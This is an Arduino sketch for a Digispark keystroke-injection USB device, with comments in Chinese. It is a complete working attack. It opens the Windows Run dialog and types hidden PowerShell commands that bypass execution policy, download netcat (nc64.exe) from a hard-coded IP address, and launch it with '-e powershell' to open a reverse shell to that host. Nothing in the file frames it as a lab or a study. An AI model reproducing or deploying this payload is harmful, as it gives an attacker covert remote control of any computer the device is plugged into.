#include "DigiKeyboard.h"
void setup() {
}
void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);
  // 打開運行對話框
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
   
  // powershell -Command "Start-Process -FilePath 'powershell.exe' -ArgumentList '-NoProfile', '-ExecutionPolicy Bypass', '-Command', \"Invoke-WebRequest 'http://1.174.228.253:8000/nc64.exe' -OutFile '$env:TEMP\nc64.exe'\" -WindowStyle Hidden"
  // 使用 Start-Process 隱藏執行 Invoke-WebRequest
  DigiKeyboard.print("powershell -Command \"Start-Process -FilePath 'powershell.exe' ");
  DigiKeyboard.delay(1000);
  DigiKeyboard.print("-ArgumentList '-NoProfile', '-ExecutionPolicy Bypass', ");
  DigiKeyboard.delay(1000);
  DigiKeyboard.print("'-Command', \\\"Invoke-WebRequest 'http://1.174.228.253:8000/nc64.exe' -OutFile '$env:TEMP\\nc64.exe'\\\" ");
  DigiKeyboard.delay(1000);
  DigiKeyboard.print("-WindowStyle Hidden\"");
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1500);

  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
 // 使用 Start-Process 隱藏執行 nc64.exe
  DigiKeyboard.print("powershell Start-Process -FilePath \"$env:TEMP\\nc64.exe\" -ArgumentList '1.174.228.253', '9000', '-e', 'powershell' -WindowStyle Hidden");
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2000);
  
  // 防止腳本再次執行
  for (;;) {
  }
}
  